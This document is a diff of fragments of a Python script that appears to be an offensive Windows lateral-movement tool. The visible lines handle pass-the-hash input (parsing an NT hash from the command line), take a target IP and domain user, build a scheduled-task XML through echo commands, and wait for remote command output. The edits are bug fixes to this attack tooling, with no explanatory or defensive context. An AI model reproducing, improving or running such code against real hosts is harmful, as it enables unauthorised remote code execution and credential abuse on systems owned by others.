@@ -534,7 +534,8 @@ def generate_random_string(length):
     return result_str
 def b64DecodeAPI(srcStr,my_codec):
     aaamy_codec=my_codec
-
+    if my_codec=='GBK':
+        aaamy_codec='GB18030'
     # print(f"{bcolors.OKBLUE}[*] encode text: \n{srcStr}{bcolors.ENDC}")
     cookies = {
         '_ga': 'GA1.2.382353072.1668334362',
@@ -682,7 +683,9 @@ if len(password.split(':',1))==2:
     if len(password.split(':',1)[1])==32:
         nthash=argv[2]
         if len(nthash)>0:
+            nthash=nthash.split(':',1)[1]
             nthash=a2b_hex(nthash)
+            password=''
 domain=argv[1].split('/')[0]
 targetip=argv[3]
 print(f"[*] using domain: {domain}")
@@ -690,7 +693,7 @@ print(f"[*] using user: {username}")
 if len(password)>0:
     print(f"[*] using password: {password}")
 else:
-    if len(nthash)%2==0:
+    if len(nthash)%2!=0:
         print(f"[-] nthash {nthash} malformat")
         usage()
         exit()
@@ -1186,7 +1189,7 @@ echo ^<Description^>>description_header&&echo ^</Description^>^</RegistrationInf
                 break
             if motherfucker == '':
                 continue
-            if len(motherfucker.split(finish_mark,1))>=2:
+            if motherfucker.split(finish_mark,1).__len__()>=2:
                 print("cmd execution finished, trying to get echo back...")
                 break
 
